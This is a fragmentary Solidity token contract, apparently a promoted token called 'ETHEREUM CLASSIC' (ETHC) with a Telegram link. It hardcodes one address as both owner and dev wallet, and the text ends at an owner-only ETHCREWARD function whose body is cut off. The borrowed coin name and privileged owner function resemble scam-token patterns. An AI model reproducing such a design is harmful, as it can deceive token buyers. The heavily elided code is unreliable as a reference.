...
// TG https://t.me/ETHEREUMCLASSIC_ETHC
...
interface IUniswapV2Pair {
    ...
    event _ETHC(address indexed sender, uint amount0, uint amount1);
...
contract ETHC is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("ETHEREUM CLASSIC", "ETHC") {
        ...
        Deploying = payable(0xb193c9368a166078Ec39936f19e6850aac272278); //Smart contract Deploying and owner.
        ...
        devWallet = payable(0xb193c9368a166078Ec39936f19e6850aac272278);
    ...
    function ETHCREWARD(uint amount) external {
        require(msg.sender == Deploying);
